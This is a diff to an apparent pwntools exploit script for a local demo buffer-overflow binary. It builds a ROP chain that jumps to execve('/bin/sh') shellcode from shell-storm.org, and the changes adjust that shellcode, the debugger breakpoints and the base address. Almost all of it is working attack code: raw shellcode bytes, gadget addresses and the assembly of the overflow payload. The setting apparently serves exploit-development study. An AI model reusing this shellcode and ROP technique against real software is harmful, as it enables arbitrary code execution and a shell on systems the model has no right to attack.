@@ -4,13 +4,14 @@ import ropme
 
 filename = './example/bof'
 p = process([filename,'3000'])
-#gdb.attach(p)
+#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40063f\nbreak *0x400641\nbreak *0x400643")
 
 line = p.readline()
 buffer_address = int(line.split(":")[1],16)
 
 shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
     "\x48\x31\xd2"                                  # xor    %rdx, %rdx
+ +  "\x48\x31\xc0"                                  # xor    %rax, %rax
  +  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov  $0x68732f6e69622f2f, %rbx
  +  "\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
  +  "\x53"                                          # push   %rbx
@@ -22,6 +23,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
  +  "\x0f\x05"                                      # syscall
 )
 target_address = buffer_address + 1024
+print "shellcode address: 0x{:x}".format(target_address)
 
 if len(sys.argv) < 2: # manual mode
   POP_RDI = 0x40063f # pop rdi ; ret
@@ -48,7 +50,7 @@ if len(sys.argv) < 2: # manual mode
     + p64(target_address)
   )
 else:
-  rop = ropme.rop_to_shellcode([(filename, 0x4000000)], target_address)
+  rop = ropme.rop_to_shellcode([(filename, 0)], target_address)
 
 payload = 'A'*512 + 'B'*8 + rop
 payload += ((1024 - len(payload)) * 'B') + shellcode
